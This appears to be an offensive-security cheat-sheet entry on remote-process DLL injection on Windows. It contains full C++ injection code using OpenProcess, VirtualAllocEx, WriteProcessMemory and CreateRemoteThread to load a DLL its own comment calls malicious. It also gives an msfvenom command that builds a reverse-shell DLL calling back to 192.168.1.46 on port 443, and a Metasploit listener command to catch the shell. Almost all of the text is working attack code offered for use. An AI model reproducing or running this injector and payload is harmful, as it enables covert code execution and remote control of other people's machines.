## DLL inject Remote process

dll-inject.cpp

```cpp
#include <iostream>
#include <Windows.h>
#include <iomanip>


int main(int argc, char* argv[]) {
HANDLE processHandle;
PVOID remoteBuffer;
wchar_t dllPath[] = TEXT("E:\\Execution\\injection\\mswin.dll");

printf("Injecting DLL to PID: %i\n", atoi(argv[1]));
//open process to obtain handles
processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
// Allocate the space for injecting the path of the malicious DLL file to the target process 
remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof dllPath, MEM_COMMIT, PAGE_READWRITE);
// Write the path of the DLL into the allocated space
WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)dllPath, sizeof dllPath, NULL);
// Retrieve the address of LoadLibrary from kernel32.dll, that given the path to DLL, loads it into memory 
PTHREAD_START_ROUTINE threatStartRoutineAddress = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT("Kernel32")), "LoadLibraryW");
// Call CreateRemoteThread passing it the address of LoadLibrary causing the injected DLL file’s path to be loaded into memory and executed.
CreateRemoteThread(processHandle, NULL, 0, threatStartRoutineAddress, remoteBuffer, 0, NULL);
CloseHandle(processHandle);

return 0;
}
```

### payload

* `mswin.dll` genetrate dll payload 
  
  ```command
  msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.46 LPORT=443 -f dll > /var/www/html/msin.dll
  ```
  
  ### listener
  
  ```bash
  msfconsole -x "use exploits/multi/handler; set lhost 192.168.1.46; set lport 443; set payload windows/shell/reverse_tcp; exploit"
  ```
